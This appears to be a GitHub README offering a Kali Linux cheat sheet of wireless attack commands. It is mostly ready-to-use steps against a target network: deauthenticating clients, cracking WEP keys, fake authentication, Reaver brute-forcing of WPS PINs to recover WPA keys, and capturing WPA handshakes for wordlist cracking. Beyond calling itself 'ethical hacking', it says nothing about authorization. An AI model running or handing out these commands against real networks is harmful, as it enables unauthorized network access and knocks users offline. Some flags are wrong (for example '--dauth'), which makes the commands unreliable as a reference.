# Useful Hacking and Penetration Testing Commands

Useful commands in Kali Linux for penetration testing and ethical hacking

## Basic Linux commands: Device information

View information about your own device. IP addresses, adapters connected, etc... 

```bash
ifconfig 
```
View information about wireless interfaces in your device

```bash
iwconfig
```
To change wireless adapter into monitor mode. Monitor mode allow us to sniff packets through the network

```bash
iwconfig wlan0 mode monitor
```

## Preconnection Attack: Airodump-ng

Discover wireless networks within range:
```bash
airodump-ng wlan0
```

To sniff packets in the selected network: 

```bash
airodump-ng --bssid _____ --channel _ --write _test_ wlan0 
```
bssid: mac address of target network
channel: channel of the network
write: if you want to store the packets in a file
wlan0: wireless adapter name

The test file will be available with the .cap file. 
View the .cap file in ```wireshark test.cap```

## Deauthentication Attack

Disconnect any client form any network

```bash
aireplay-ng --dauth <NumOfPackets> -a <NetworkMacaddress> -c <TargetClientMacAddress> -e <WifiNname> <iterface-wlan0>
```
## WEP Cracking

1. Capture a large number of packets with airodump-ng
```bash
airodump-ng --bssid _____ --channel _ --write _test_ wlan0 
```
2. Analyse the captured packets and crack the key with aircrack-ng
```bash
aircrack-ng .capfile
```
3. output: KEY IS FOUND
4. Remove the colons from the key and use it as password

## Fake Authentication Attack

```bash
aireplay-ng --fakeauth 0 -a <TargetMacAddress> -h <WirelessAdapterMacAddress> <interface>
```
**NOTE: Type "ifconfig" to view wireless adapter mac address (unspec ---> first 12 digits)**

This attack injects packets in the network.

## WPA/WPA2
If WPS is Enable:
1. Displays networks with WPS enabled
```bash 
wash --interface wlan0
```
2. 
```bash
aireplay-ng --fakeauth <30> -a <TargetMacAddress> --interface <wlan0>
```
3. Run Reaver in another terminal window
```bash
reaver --bssid <TargetMacAddress> --channel <TargetChannel> --interface <wlan0> -vvv --no-associate
```
**NOTE: if bug error, then download older version of reaver and run ./reaver _______ **

4. Results: WPS PIN and WPA PSK

If WPS is disable:
1. Capture Handshake between devices
```bash
airodump-ng --bssid <TargetMacAddress> --channel <Channel> --write <handshake> <wlan0>
```
- Wait for the handshake
- wait for a new client or disconnect a client with a fake auth attack. 
- WPA handshake stored in the file 

- Create a wordlist
```bash 
crunch [min][max][characters] -T[pattern] -o [FileName]
```
Exampel:
```bash
crunch 6 8 abc12 -o test.txt
```
2. Wordlist attack 
```bash
aircrack-ng <handshake.cap> -w <text.txt>
```




## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)